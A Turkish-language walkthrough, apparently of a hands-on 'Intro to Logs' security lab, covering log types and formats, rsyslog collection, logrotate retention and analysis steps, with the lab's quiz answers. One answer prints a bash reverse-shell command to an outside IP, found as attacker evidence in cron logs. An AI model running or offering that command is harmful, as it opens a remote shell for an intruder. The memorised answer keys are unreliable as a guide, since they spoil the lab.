**Intro to Logs(Log(kayıt) giriş)**

*Görev 1-Giriş*

Kötü niyetli faaliyetleri nasıl tespit edebiliriz?

Bir saldırgan bir ağa girdiğinde ne tür kanıtlar üretilir?

Bu göstergeleri çevremizde tanımak neden önemlidir?

Logs (kayıtlar), geçmiş olayların paha biçilmez kayıtları olarak hizmet eder ve bu soruları ele almak için temel içgörüler sağlar. 

Tarihsel faaliyetlerin bir arşivini koruyarak, güvenlik duruşumuzu güçlendirebilir ve dijital varlıklarımızı daha etkili bir şekilde koruyabiliriz. 

**Öğrenme amaçları*

Logs(kayıtların) kapsamlı bir şekilde anlaşılması, kalıpları belirlemek ve olası tehditleri azaltmak için çok önemlidir. 

Çok sayıda sistem ve uygulama tarafından oluşturulan muazzam miktardaki günlük verisini manuel olarak incelemek zor olabileceğinden, günlük analizinin inceliklerini kavramak ve mevcut araçlar ve tekniklerle tanışmak hayati önem taşır. 

Logs (kayıtlar) analizi araçları ve yöntemleri, bireylere tarihsel olayları yorumlama ve güvenilir bir tarihsel kanıt kaynağı oluşturma, günlük verilerinin işlenmesini ve incelenmesini kolaylaştırma olanağı sağlar.

Bu verimlilik, olası olayların veya önemli olayların hızlı bir şekilde tespit edilmesini ve bunlara yanıt verilmesini kolaylaştırır.

Logları tarihsel faaliyetlerin kayıtları olarak analiz ederek, bireyler ve kuruluşlar temel bilgiler edinebilir, çok çeşitli durumlarda genel farkındalıklarını ve hazırlıklarını artırabilirler.

Logların, olası tehditleri belirlemek ve azaltmak için tarihsel bir etkinlik kaydı olarak önemini anlayın. Birden fazla platformda çeşitli günlük türlerini, günlük mekanizmalarını ve toplama yöntemlerini keşfedin. Log analizi yoluyla saldırganları tespit etme ve yenme konusunda uygulamalı deneyim kazanın.

**Tavsiye edilen okuma*

Bu oda, öncelikle Linux tabanlı bir VM kullanarak günlüklere ve günlük dosyalarına odaklanacaktır; Windows'a özgü olay günlükleriyle ilgilenenler için Windows Olay Günlükleri odasını tamamlamanız önerilir.

Loglarla çeşitli platformlarda varlıkların güvenlik duruşunu güçlendirmek için gereken uzmanlığı geliştireceğiniz bu heyecan verici yolculuğa katılın!

![log giriş](https://github.com/user-attachments/assets/912a7b67-e121-4aa0-98c2-35bc8bccd092)

**Görev 2 - Genişleyen Perspektifler: Tarihsel Aktivitenin Kanıtı Olarak Loglar(Kayıtlar)**

*Kayıtlarla Çalışma: Senaryo**

Senaryo: SwiftSpend Financial'ın bir web sunucusu, sürekli olarak bir saldırganın taramalarıyla tanımlanıyor. 

Bu ikilemi ele almakla görevli bu kuruluşun sistem yöneticisi olarak, günlükleri yapılandırarak ve toplanan günlükleri analiz ederek saldırganın ne yaptığını belirlemelisiniz.

ÖNEMLİ: damianhall kullanıcısı sınırlı sudo ayrıcalıklarına sahiptir. 
Bu kullanıcı tarafından hangi komutların çalıştırılabileceğini kontrol etmek için sudo -l komutunu verin.
Bu sınırlı komutlar, sonraki görevleri tamamlamak için gereken tek şeydir.

*Makineye bağlanma*
Aşağıdaki yeşil Başlat Makine düğmesine tıklayarak sanal makineyi bölünmüş ekran görünümünde başlatın.
VM görünmüyorsa, sayfanın sol üst kısmındaki mavi Show Split View düğmesini kullanın. 
Alternatif olarak, aşağıdaki kimlik bilgilerini kullanarak VM'ye RDP veya SSH üzerinden bağlanabilirsiniz.

![domain_IP](https://github.com/user-attachments/assets/5f51876c-c995-44e0-b648-d608115fda62)

ÖNEMLİ: Ekli VM, günlükleri ve analizlerinin algılama mühendisliği ve olay yanıt uygulamalarına olan etkilerini daha iyi anlamamıza yardımcı olacak eserler içerir.
Sonraki görevler üzerinde çalışın ve bir vaka örneği aracılığıyla VM ile deneyler yapın.Bu odadaki soruları cevaplamak için Ayrıcalıkların Yükseltilmesi GEREKLİ DEĞİLDİR.

*Verinin Kalbinde: Loglar**

Fiziksel bir ağacın halkaları yaşam öyküsünü ortaya koyduğu gibi - kalın buklelerle iyi yılları ve ince buklelerle zorlu yılları gösterir - dijital bir kayıt, sistem etkinliğinin tarihsel bir kaydını sağlar.
Her ikisi de zaman içinde büyümenin temel ilkesini temsil eder ve kendi alanlarında - fiziksel ve dijital - yaşayan kayıtlar olarak hizmet eder.
Dijital dünyada, bir bilgisayar sistemiyle her etkileşim - kimlik doğrulama girişimlerinden, yetkilendirmeye, bir dosyaya erişmeye ve bir ağa bağlanmaya ve bir sistem hatasıyla karşılaşmaya - her zaman günlükler biçiminde dijital bir ayak izi bırakacaktır.

Loglar, bir sistemdeki olayların kaydıdır. Bu kayıtlar, bir sistemin ne yaptığına dair ayrıntılı bir hesap sağlar ve kullanıcı oturum açmaları, dosya erişimleri, sistem hataları, ağ bağlantıları ve veri veya sistem yapılandırmalarındaki değişiklikler gibi çok çeşitli olayları yakalar.
Belirli ayrıntılar log türüne göre farklılık gösterebilse de, bir log girişi genellikle aşağıdaki bilgileri içerir:

•	Bir olayın ne zaman kaydedildiğine dair bir zaman damgası
•	Log girişini oluşturan sistem veya uygulamanın adı
•	Gerçekleşen olayın türü
•	Olayı başlatan kullanıcı veya olayı oluşturan cihazın IP adresi gibi olayla ilgili ek ayrıntılar

Bu bilgiler genellikle bir sistemde belirli bir zamanda gerçekleşenlerin toplu girişlerini içeren bir log dosyasında saklanır.

Ancak, dijital etkileşimler sürekli ve hızlı tempolu olduğundan, günlük dosyasının boyutu bir sistemde kaydedilen etkinliklere bağlı olarak katlanarak büyüyebilir.

*Logların Gerçek Gücü: Bağlamsal Korelasyon*

Tek bir log girişi kendi başına önemsiz görünebilir. 

Ancak log verileri toplandığında, analiz edildiğinde ve diğer bilgi kaynaklarıyla çapraz referanslandığında, güçlü bir araştırma aracı haline gelir.

Loglar, bir olay hakkında kritik soruları yanıtlayabilir, örneğin:

	Ne oldu?

	Ne zaman oldu?

	Nerede oldu?

	Kim sorumlu?

	Eylemleri başarılı mıydı?

	Eylemlerinin sonucu ne oldu?

Aşağıdaki varsayımsal senaryo bu yönü örneklendirebilir. 

Bir öğrencinin bir Üniversite ağında uygunsuz içeriğe eriştiği iddia edilsin. Logları inceleyerek, bir sistem yöneticisi daha sonra şu soruları yanıtlayabilir:

![tablo](https://github.com/user-attachments/assets/32b2defa-a20a-4f8b-b477-d3dfde479b03)


Yukarıdaki örnek, logların bir olayın bütünsel resmini oluşturmada nasıl önemli bir rol oynadığını ve böylece anlayışımızı ve etkili bir şekilde yanıt verme yeteneğimizi nasıl geliştirdiğini vurgulamaktadır.

**Masaüstünüze not bırakan meslektaşınızın adı nedir?**
**Cevap:** Perry

![soru1_cevap](https://github.com/user-attachments/assets/d7e8d065-a3c8-4ad1-9a85-368e9c090477)

**İlk inceleme için önerilen günlük dosyasının tam yolu nedir?**
**Cevap:** /var/log/gitlab/nginx/access.log

![soru2 cevap](https://github.com/user-attachments/assets/79e9c47a-586a-413a-bc81-c390b85fe346)

**Görev 3- Türler, Biçimler ve Standartlar**
**Log Türleri*

Belirli log(kayıt) türleri, bir sistemin çalışması, performansı ve güvenliği hakkında benzersiz bir bakış açısı sunabilir. 
Çeşitli log türleri olsa da, tipik kullanım durumlarının yaklaşık %80'ini kapsayan en yaygın olanlara odaklanacağız.

Aşağıda en yaygın log türlerinden bazılarının bir listesi bulunmaktadır:

*Uygulama Kayıtları:* Durum, hatalar, uyarılar vb. dahil olmak üzere belirli uygulamalarla ilgili mesajlar.

*Denetim Kayıtları:* Mevzuata uyum için kritik öneme sahip operasyonel prosedürlerle ilgili faaliyetler.

*Güvenlik Kayıtları:* Oturum açma, izin değişiklikleri, güvenlik duvarı etkinliği vb. gibi güvenlik olayları.

*Sunucu Kayıtları:* Sistem, olay, hata ve erişim günlükleri dahil olmak üzere bir sunucunun oluşturduğu çeşitli günlükler.

*Sistem Kayıtları:* Çekirdek etkinlikleri, sistem hataları, önyükleme dizileri ve donanım durumu.

*Ağ Kayıtları:* Ağ trafiği, bağlantılar ve diğer ağ ile ilgili olaylar.

*Veritabanı Kayıtları:* Sorgular ve güncellemeler gibi bir veritabanı sistemindeki faaliyetler.

*Web Sunucusu Kayıtları:* URL'ler, yanıt kodları vb. dahil olmak üzere bir web sunucusu tarafından işlenen istekler.
Çeşitli kayıt türlerini, biçimlerini ve standartlarını anlamak, pratik günlük analizi için kritik öneme sahiptir.
Bir analistin kayıt verilerinden etkili bir şekilde ayrıştırmasını, yorumlamasını ve içgörüler elde etmesini sağlayarak sorun gidermeyi, performans optimizasyonunu, olay yanıtını ve tehdit avını kolaylaştırır.

**Log  Biçimleri**

Log biçimi, bir günlük dosyasındaki verilerin yapısını ve organizasyonunu tanımlar. Verilerin nasıl kodlandığını, her girdinin nasıl sınırlandırıldığını ve her satıra hangi alanların dahil edildiğini belirtir. Bu biçimler büyük ölçüde değişebilir ve üç ana kategoriye ayrılabilir: Yarı yapılandırılmış, Yapılandırılmış ve Yapılandırılmamış. Bu kategorileri inceleyeceğiz ve kullanımlarını örneklerle göstereceğiz.

*Yarı Yapılandırılmış Loglar:* Bu loglar, öngörülebilir bileşenlerin serbest biçimli metni barındırmasıyla yapılandırılmış ve yapılandırılmamış veriler içerebilir. Örnekler şunları içerir:

	Syslog Mesaj Biçimi: Sistem ve ağ günlükleri için yaygın olarak benimsenen bir loglama protokolüdür.

![syslog](https://github.com/user-attachments/assets/b55e09db-b645-4275-b570-6cbd76043f1c)

	Windows Event Log (EVTX) Format: Windows sistemleri için özel Microsoft kaydı.

![eventlog](https://github.com/user-attachments/assets/b874c6bf-6f5c-4721-bd5f-d5c46320c5fe)

Yapılandırılmış Loglar: Sıkı ve standartlaştırılmış bir formatı izleyen bu kayıtlar, ayrıştırma ve analize elverişlidir. 

Tipik yapılandırılmış günlük biçimleri şunları içerir:

	Alanla Ayrılmış Biçimler: Virgülle Ayrılmış Değerler (CSV) ve Sekmeyle Ayrılmış Değerler (TSV), genellikle tablolu veriler için kullanılan biçimlerdir.


	JavaScript Object Notation (JSON): Okunabilirliği ve modern programlama dilleriyle uyumluluğu ile bilinir.

![json](https://github.com/user-attachments/assets/d2ab9ecc-a663-472a-85aa-1c227f187051)

	W3C Genişletilmiş Kayıt Biçimi (ELF): World Wide Web Konsorsiyumu (W3C) tarafından tanımlanmıştır, web sunucusu günlüğü için özelleştirilebilir. 
Genellikle Microsoft Internet Information Services (IIS) Web Sunucusu tarafından kullanılır.

![elf](https://github.com/user-attachments/assets/9d155d27-749d-46f0-9929-d26c04b6a121)

	Genişletilebilir İşaretleme Dili (XML): Standartlaştırılmış kayıtlama biçimleri oluşturmak için esnek ve özelleştirilebilir.

![xml](https://github.com/user-attachments/assets/4b603d8b-c7cf-4586-b0ba-c85f00ddf6a2)

Yapılandırılmamış Kayıtlar: Serbest biçimli metinlerden oluşan bu kayıtlar, bağlam açısından zengin olabilir ancak sistematik ayrıştırmada zorluklara yol açabilir.

Örnekler şunları içerir:

	NCSA Ortak Günlük Formatı (CLF): İstemci istekleri için standartlaştırılmış bir web sunucusu günlük formatı. 
Genellikle varsayılan olarak Apache HTTP Sunucusu tarafından kullanılır.

![clf](https://github.com/user-attachments/assets/2114263c-b1b0-47fd-ad53-91dea444243c)

	NCSA Combined Log Format (Combined): CLF'nin bir uzantısıdır, referrer ve user agent gibi alanlar ekler.
Genellikle varsayılan olarak Nginx HTTP Server tarafından kullanılır.

![NCSA](https://github.com/user-attachments/assets/361e964b-6e46-4677-babd-db2a13cb2a64)

ÖNEMLİ: Özel tanımlı formatlar, belirli uygulamaları veya kullanım durumlarını karşılamak için hazırlanabilir. 
Bu formatlar esneklik sağlar ancak etkili yorumlama ve analiz için özel ayrıştırma araçları gerektirebilir.

**Log(Kayıt) Standartları*

Bir log standardı, günlüklerin nasıl oluşturulacağını, iletileceğini ve depolanacağını tanımlayan bir dizi kılavuz veya özelliktir. 
Log(kayıt) standartları belirli günlük formatlarının kullanımını belirtebilir ancak aynı zamanda hangi olayların kaydedileceği, günlüklerin güvenli bir şekilde nasıl iletileceği ve günlüklerin ne kadar süreyle saklanacağı gibi loglamanın diğer yönlerini de kapsar. 

Log standartlarına ait örnekler şunlardır:

Ortak Olay İfadesi (CEE): MITRE tarafından geliştirilen bu standart, kayıt verileri için ortak bir yapı sağlayarak logları oluşturmayı, iletmeyi, depolamayı ve analiz etmeyi kolaylaştırır.
OWASP Loglama Hile Sayfası: Geliştiriciler için özellikle güvenlik kayıtıyla ilgili uygulama loglama mekanizmaları oluşturma kılavuzu. 

Syslog Protokolü: Syslog, mesajları üreten yazılımın, mesajları depolayan sistemden ve bunları raporlayan ve analiz eden yazılımdan ayrılmasını sağlayan bir mesaj günlüğü standardıdır.

NIST Özel Yayını 800-92: Bu yayın bilgisayar güvenliği log(kayıt) yönetimine rehberlik eder.

Azure Monitor Kayıtları: Microsoft Azure'da günlük izleme yönergeleri.

Google Cloud Kaydı: Google Cloud Platform'da (GCP) günlük kaydı için yönergeler.

Oracle Cloud Altyapı Kaydı: Oracle Cloud Altyapısı'nda (OCI) log kaydı için yönergeler.

Virginia Tech - Bilgi Teknolojileri Günlüğü Standardı: Örnek log incelemesi ve uyumluluk kılavuzu.

**Bu görevdeki günlük türlerinin listesine dayanarak, Görev 2'deki notta belirtilen günlük dosyası tarafından hangi günlük türü kullanılıyor?**
**Cevap:** Web Server Log

**Bu görevdeki günlük biçimleri listesine dayanarak, Görev 2'deki notta belirtilen günlük dosyası tarafından hangi günlük biçimi kullanılır?**
**Cevap:** Combined

**Görev 4- Toplama, Yönetim ve Merkezileştirme**
*Log(kayıt) Toplama**

Log (kaydı) toplama, sunucular, ağ aygıtları, yazılımlar ve veritabanları gibi çeşitli kaynaklardan gelen günlüklerin toplanmasını içeren kayıt analizinin temel bir bileşenidir.
Logların olayların kronolojik bir dizisini etkili bir şekilde temsil edebilmesi için, log kaydı sırasında sistemin zaman doğruluğunu korumak çok önemlidir. 

Ağ Zaman Protokolü'nü (NTP) kullanmak, bu senkronizasyonu elde etmek ve kayıtlarda depolanan zaman çizelgesinin bütünlüğünü sağlamak için bir yöntemdir.
Bu, bir güvenlik analistinin incelemek üzere kapsamlı bir veri kümesine sahip olmasını sağlamanın temel bir adımı olduğundan, önemli bilgilere göre toplamayı önceliklendirme ihtiyacını akılda tutarak, bunu başarmak için basit bir adım adım süreç aşağıdadır:
Kaynakları Belirleyin: Sunucular, veritabanları, uygulamalar ve ağ aygıtları gibi tüm olası günlük kaynaklarını listeleyin.

Bir Log Toplayıcı Seçin: Altyapınızla uyumlu uygun bir günlük toplayıcı aracı veya yazılımı seçin. 
Toplama Parametrelerini Yapılandırın: Doğru zaman çizelgelerini korumak için zaman senkronizasyonunun NTP üzerinden etkinleştirildiğinden emin olun, hangi olayların hangi aralıklarla kaydedileceğini belirlemek için ayarları düzenleyin ve öneme göre önceliklendirin.
Toplama Testi: Yapılandırıldıktan sonra, günlüklerin tüm kaynaklardan uygun şekilde toplandığından emin olmak için bir test çalıştırın.

ÖNEMLİ: Lütfen NTP tabanlı zaman senkronizasyonunun, internet bağlantısı olmadığı için VM ile çoğaltılmasının mümkün olmayabileceğini unutmayın. 
Ancak, bunu pratikte gerçekleştirirken, bir NTP sunucusu bulmak için pool.ntp.org kullanmak en iyisidir. 
Zaman senkronizasyonu, Linux tabanlı sistemlerde otomatik olarak gerçekleştirilebilir veya ntpdate pool.ntp.org yürütülerek manuel olarak başlatılabilir.

![ntp](https://github.com/user-attachments/assets/eb182e64-9a0f-4931-87e5-f82062193260)


*Log Yönetimi*
Etkin log yönetimi, toplanan her logun güvenli bir şekilde depolanmasını, sistematik olarak düzenlenmesini ve hızlı bir şekilde alınmaya hazır olmasını sağlar. Hibrit bir yaklaşım, tüm log dosyalarını biriktirerek ve seçici bir şekilde kırparak dengeli bir çözüm sağlayabilir.

Kayıtlarınızı bir araya getirdikten sonra, bunların etkili bir şekilde yönetilmesi çok önemlidir. Bunu başarmak için şu adımlar izlenebilir:

*Depolama:* Saklama süresi ve erişilebilirlik gibi faktörleri göz önünde bulundurarak güvenli bir depolama çözümü belirleyin.

*Organizasyon:* Daha sonra daha kolay erişim için günlükleri kaynaklarına, türlerine veya diğer kriterlere göre sınıflandırın.

*Yedekleme:* Veri kaybını önlemek için kayıtlarınızı düzenli olarak yedekleyin.

*İnceleme:* Doğru şekilde depolandığından ve kategorilendirildiğinden emin olmak için logları düzenli olarak inceleyin.

*Log Merkezileştirme**
Merkezileştirme, hızlı log erişimi, derinlemesine analiz ve hızlı olay müdahalesi için çok önemlidir. 
Birleşik bir sistem, gerçek zamanlı algılama, otomatik bildirimler ve olay yönetim sistemleriyle sorunsuz entegrasyon sunan araçlarla verimli log yönetimine olanak tanır.
Kayıtlarınızı merkezileştirmek, erişimi ve analizi önemli ölçüde kolaylaştırabilir. 
Bunu başarmak için basit bir süreç şöyledir:

Merkezi Bir Sistem Seçin: Elastic Stack veya Splunk gibi tüm kaynaklardan gelen kayıtları birleştiren bir sistem seçin.

Kaynakları Entegre Edin: Tüm kayıt(log) kaynaklarınızı bu merkezi sisteme bağlayın.

İzlemeyi Ayarlayın: Belirtilen olaylar için gerçek zamanlı izleme ve uyarılar sağlayan araçları kullanın.

Olay Yönetimiyle Entegrasyon: Merkezi sisteminizin, yerleşik herhangi bir olay yönetimi aracı veya protokolüyle sorunsuz bir şekilde entegre olabileceğinden emin olun.

Pratik Etkinlik: rsyslog ile Kayıt(Log) Toplama

Bu etkinlik rsyslog'u tanıtmayı ve günlüklerin merkezileştirilmesini ve yönetimini nasıl geliştirebileceğini göstermeyi amaçlamaktadır. 
Toplama sürecinin bir parçası olarak, rsyslog'u tüm sshd mesajlarını /var/log/websrv-02/rsyslog_sshd.log gibi belirli bir dosyaya kaydedecek şekilde yapılandıracağız. 
Bunu başarmak için aşağıdaki adımlar izlenebilir:
Bir Terminal açın.

Rsyslog'un Yüklü Olduğundan Emin Olun: Rsyslog'un yüklü olup olmadığını şu komutu çalıştırarak kontrol edebilirsiniz: 
sudo systemctl status rsyslog

Bir Yapılandırma Dosyası Oluşturun: Aşağıdaki yapılandırma dosyasını oluşturmak için bir metin düzenleyici kullanın:
gedit /etc/rsyslog.d/98-websrv-02-sshd.conf, nano /etc/rsyslog.d/98-websrv-02-sshd.conf, vi /etc/rsyslog.d/98-websrv-02-sshd.conf veya vim /etc/rsyslog.d/98-websrv-02-sshd.conf

Yapılandırmayı Ekleyin: Sshd mesajlarını belirli log dosyasına yönlendirmek için /etc/rsyslog.d/98-websrv-02-sshd.conf dosyasına aşağıdaki satırları ekleyin:
$FileCreateMode 0644:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log

Yapılandırma Dosyasını Kaydedin ve Kapatın.

rsyslog'u yeniden başlatın: rsyslog'u şu komutla yeniden başlatarak değişiklikleri uygulayın: sudo systemctl restart rsyslog

Yapılandırmayı Doğrulayın: Yapılandırmanın çalıştığını, ssh localhost üzerinden localhost'a bir SSH bağlantısı başlatarak veya bir veya iki dakika sonra kayıt dosyasını kontrol ederek doğrulayabilirsiniz.

![websvr](https://github.com/user-attachments/assets/0c3380ad-e220-438a-a06d-b05ceb12a845)

ÖNEMLİ: Eğer kayıtların uzaktan iletilmesi yapılandırılmamışsa, kayıtların manuel olarak toplanması için scp / rsync gibi araçlar kullanılabilir.
**sshd için rsyslog yapılandırıldıktan sonra, /var/log/websrv-02/rsyslog_sshd.log konumundaki sshd günlüklerinde başarısız oturum açma girişimlerini veya kaba kuvvet saldırısını gösteren kullanıcı adı tekrar tekrar hangisidir?**
**Cevap:**    stansimon

![stanmison](https://github.com/user-attachments/assets/cf03268a-581f-4575-be30-a4bd61f194c9)

** Cron mesajlarını izlemek için kullanılan rsyslog yapılandırma dosyası /etc/rsyslog.d/99-websrv-02-cron.conf'a göre SIEM-02'nin IP adresi nedir?**
**Cevap:**  10.10.10.101

![syslog_d](https://github.com/user-attachments/assets/057385cd-5595-4aae-9cb2-16350574339f)


** /var/log/websrv-02/rsyslog_cron.log dosyasında oluşturulan günlüklere dayanarak, kök kullanıcı tarafından hangi komut yürütülüyor?**
**Cevap:** /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
![srvweb](https://github.com/user-attachments/assets/072fcb98-4725-4b8a-a2e0-cb44c2f08f15)


**Görev 5: Depolama, Saklama ve Silme**
*Log Depolama*

Loglar, bunları üreten yerel sistem, merkezi bir depo veya bulut tabanlı depolama gibi çeşitli konumlarda depolanabilir.

Depolama konumunun seçimi genellikle birden fazla faktöre bağlıdır:

**Güvenlik Gereksinimleri:** Kayıtların kurumsal veya düzenleyici güvenlik protokollerine uygun şekilde depolanmasını sağlamak.

**Erişilebilirlik Gereksinimleri:** Kayıtlara ne kadar hızlı ve kim tarafından erişilmesi gerektiği depolama seçimini etkileyebilir.

**Depolama Kapasitesi:** Oluşturulan kayıt hacmi önemli depolama alanı gerektirebilir ve depolama çözümü seçimini etkileyebilir.

**Maliyet Hususları:** Kayıt depolama bütçesi, bulut tabanlı veya yerel çözümler arasındaki seçimi belirleyebilir.

**Uyumluluk Düzenlemeleri:** Kayıt depolamayı yöneten belirli endüstri düzenlemeleri depolama seçimini etkileyebilir.

**Saklama Politikaları:** Gerekli saklama süresi ve alma kolaylığı karar verme sürecini etkileyebilir.

** Kurtarma Planları:** Sistem arızasında bile kayıtların kullanılabilirliğini sağlamak belirli depolama çözümleri gerektirebilir.

**Kayıt Tutma**

Log depolamanın sonsuz olmadığını kabul etmek hayati önem taşır.
Bu nedenle, kayıtları potansiyel gelecekteki ihtiyaçlar için tutma ve depolama maliyeti arasında makul bir denge gereklidir. 

Sıcak, Ilık ve Soğuk depolama kavramlarını anlamak bu karar alma sürecinde yardımcı olabilir:
*Sıcak Depolama: En erişilebilir olan son 3-6 aya ait günlükler. Sorgu hızı, sorgunun karmaşıklığına bağlı olarak gerçek zamana yakın olmalıdır.
*Ilık Depolama: Veri gölü görevi gören, altı aydan 2 yıla kadar olan günlükler, kolayca erişilebilir ancak Sıcak depolama kadar anında değil.
*Soğuk Depolama: 2-5 yıla kadar olan arşivlenmiş veya sıkıştırılmış günlükler. Bu kayıtlara kolayca erişilemez ve genellikle geriye dönük analiz veya kapsam belirleme amaçları için kullanılır.

Kayıtların depolanma maliyetini yönetmek kuruluşlar için kritik öneme sahiptir.
Sıcak, Ilık veya Soğuk depolama stratejilerini dikkatlice seçmek bu maliyetleri kontrol altında tutmaya yardımcı olabilir.

**Kayıt Silme**
Kayıt silme işlemi, hala değerli olabilecek günlükleri kaldırmaktan kaçınmak için dikkatli bir şekilde gerçekleştirilmelidir. 
Özellikle önemli olan günlük dosyalarının yedeklenmesi, silme işleminden önce gereklidir.
Veri koruma yasaları ve yönetmeliklerine uyumu sağlamak için iyi tanımlanmış bir silme politikasına sahip olmak esastır. 

Kayıt silme işlemi şunlara yardımcı olur:
1. Analiz için yönetilebilir boyutta kayıtlar tutmak.
2. GDPR gibi gereksiz verilerin silinmesini gerektiren gizlilik yönetmeliklerine uymak.
3. Depolama maliyetlerini dengede tutmak.

*En İyi Uygulamalar: Kayıt Depolama, Saklama ve Silme*

Depolama, saklama ve silme politikasını hem iş ihtiyaçlarına hem de yasal gerekliliklere göre belirleyin.

Değişen koşullara ve yönetmeliklere göre yönergeleri düzenli olarak gözden geçirin ve güncelleyin.

Tutarlılığı sağlamak ve insan hatalarından kaçınmak için depolama, saklama ve silme işlemlerini otomatikleştirin.
Verileri korumak için hassas günlükleri şifreleyin.

Özellikle silme işleminden önce düzenli yedeklemeler yapılmalıdır.

**Pratik Etkinlik: logrotate ile Kayıt Yönetimi**

Bu etkinlik, kayıt dosyası döndürme, sıkıştırma ve yönetimini otomatikleştiren ve günlük dosyalarının sistematik olarak işlenmesini sağlayan bir araç olan logrotate'i tanıtmayı amaçlamaktadır. Günlük dosyalarının otomatik olarak döndürülmesini, sıkıştırılmasını ve kaldırılmasını sağlar. Bir örnek olarak, /var/log/websrv-02/rsyslog_sshd.log için nasıl ayarlayabileceğimizi burada bulabilirsiniz:
1.	Bir Yapılandırma Dosyası Oluşturun:
sudo gedit /etc/logrotate.d/98-websrv-02_sshd.conf, sudo nano /etc/logrotate.d/98-websrv-02_sshd.conf, sudo vi /etc/logrotate.d/98-websrv-02_sshd.conf, or sudo vim /etc/logrotate.d/98-websrv-02_sshd.conf
2.	Kayıt Ayarlarını Tanımla

![kayıt_tamamla](https://github.com/user-attachments/assets/3beb2afc-c026-40fb-ae22-f04f0acfe62f)

3.	Dosyayı Kaydet ve Kapat
4. Manual Execution: sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
![manual_execution](https://github.com/user-attachments/assets/38e008fb-e1ca-4364-a7bf-4784b1156f8a)

**/etc/logrotate.d/99-websrv-02_cron.conf dosyasındaki logrotate yapılandırmasına dayanarak, eski sıkıştırılmış günlük dosyası kopyalarının kaç sürümü tutulacak?**
**Cevap:** 24
![logrotate](https://github.com/user-attachments/assets/68acd6e5-001d-4cfb-b32b-f5456334a924)


** /etc/logrotate.d/99-websrv-02_cron.conf dosyasındaki logrotate yapılandırmasına göre, log döndürme sıklığı nedir?**
**Cevap:** hourly

![logrotate_2](https://github.com/user-attachments/assets/30af48fa-85ac-47ff-88eb-a936f21c87a6)

**Görev 6- Uygulamalı Egzersiz: Log analiz süreci, araçları ve teknikleri**

Loglar, tarihsel olayların basit kayıtlarından daha fazlasıdır; bir rehber pusula görevi görebilirler. 
Ustaca kullanıldığında sistem tanılama, siber güvenlik ve düzenleyici uyumluluk çabalarını artırabilecek paha biçilmez kaynaklardır.
Bir sistem veya uygulama için tarihsel aktivitenin kaydını tutmadaki rolleri çok önemlidir.

**Log  Analiz Süreci*

Log analizi, Ayrıştırma, Normalleştirme, Sıralama, Sınıflandırma, Zenginleştirme, Korelasyon, Görselleştirme ve Raporlamayı içerir.
Splunk ve ELK gibi karmaşık sistemlerden varsayılan komut satırı araçlarından açık kaynaklı araçlara kadar çeşitli araçlar ve teknikler aracılığıyla yapılabilir.

**Veri Kaynakları*

Veri Kaynakları, sistem olaylarını veya kullanıcı aktivitelerini loglara kaydetmek üzere yapılandırılmış sistemler veya uygulamalardır. 
Bunlar logların kaynağıdır.

** Ayrıştırma*

Ayrıştırma, log verilerini daha yönetilebilir ve anlaşılabilir bileşenlere ayırmaktır. Loglar kaynağa bağlı olarak çeşitli biçimlerde geldiğinden, değerli bilgileri çıkarmak için bu loglar  ayrıştırmak önemlidir.

* Normalizasyon*

Normalizasyon, ayrıştırılmış verileri standart hale getirmektir. Çeşitli kayıt verilerini standart bir formata getirmeyi içerir, farklı kaynaklardan gelen verileri karşılaştırmayı ve analiz etmeyi kolaylaştırır. Her birinin başka bir formatta loglar üretebileceği birden fazla sistem ve uygulamanın olduğu ortamlarda zorunludur.

*Sıralama*

Sıralama, kayıt analizinin hayati bir yönüdür, çünkü verimli veri alımına ve desenlerin tanımlanmasına olanak tanır. 
Loglar zamana, kaynağa, olay türüne, önem derecesine ve verilerde bulunan diğer parametrelere göre sıralanabilir. 
Uygun sıralama, operasyonel sorunları veya kayıt olaylarını işaret eden eğilimleri ve anormallikleri belirlemede kritik öneme sahiptir.

*Sınıflandırma*
Sınıflandırma, kayıtların özelliklerine göre kategoriler atamayı içerir. Kayıt  dosyalarını sınıflandırarak, analiziniz için en önemli olan kayıtları hızla filtreleyebilir ve bunlara odaklanabilirsiniz. Örneğin, sınıflandırma önem düzeyine, olay türüne veya kaynağa göre yapılabilir. Makine öğrenimi kullanılarak yapılan otomatik sınıflandırma, bu süreci önemli ölçüde iyileştirebilir ve gözden kaçabilecek olası sorunları veya tehditleri belirlemeye yardımcı olabilir.

* Zenginleştirme*
Kayıt zenginleştirme, kayıtlara bağlam ekleyerek onları daha anlamlı ve analiz edilmesi daha kolay hale getirir. 
Coğrafi veriler, kullanıcı ayrıntıları, tehdit istihbaratı veya hatta olayın tam bir resmini sağlayabilecek diğer kaynaklardan gelen veriler gibi bilgilerin eklenmesini içerebilir.
Zenginleştirme, kayıtları daha değerli hale getirerek analistlerin daha iyi kararlar almasını ve olaylara daha doğru yanıt vermesini sağlar. 
Sınıflandırma gibi günlük zenginleştirme de makine öğrenimi kullanılarak otomatikleştirilebilir vekayıt analizi için gereken zaman ve çaba azaltılabilir.

*Korelasyon*

Korelasyon, ilgili kayıtları birbirine bağlamayı ve günlük girişleri arasındaki bağlantıları tanımlamayı içerir. 
Bu süreç, çeşitli günlük olayları arasındaki karmaşık ilişkileri anlamayı kolaylaştırarak, kalıpları ve eğilimleri tespit etmeye yardımcı olur. 
Korelasyon, fark edilmeyen güvenlik tehditlerini veya sistem performansı sorunlarını belirlemede kritik öneme sahiptir.

*Görselleştirme*
Görselleştirme, kayıt verilerini çizelgeler, grafikler veya ısı haritaları gibi grafiksel formatlarda temsil eder. Verileri görsel olarak sunmak, kalıpları, eğilimleri ve anormallikleri tanımayı kolaylaştırır. 
Görselleştirme araçları, büyük hacimli günlük verilerini yorumlamanın sezgisel bir yolunu sunarak karmaşık bilgileri daha erişilebilir ve anlaşılır hale getirir.

*Raporlama*
Raporlama, kayıt verilerini yapılandırılmış formatlara özetleyerek içgörüler sağlar, karar almayı destekler veya uyumluluk gerekliliklerini karşılar. 
Etkili raporlama, yönetim, güvenlik ekipleri veya denetçiler gibi paydaşların ihtiyaçlarını karşılayan net ve öz günlük veri özetleri oluşturmayı içerir. 
Düzenli raporlar, sistem sağlığını, güvenlik duruşunu ve operasyonel verimliliği izlemede hayati önem taşıyabilir.

* Log(Kayıt) Analiz Araçları*
Splunk veya Elastic Search gibi Güvenlik Bilgi ve Olay Yönetimi (SIEM) araçları karmaşık günlük analiz görevleri için kullanılabilir.
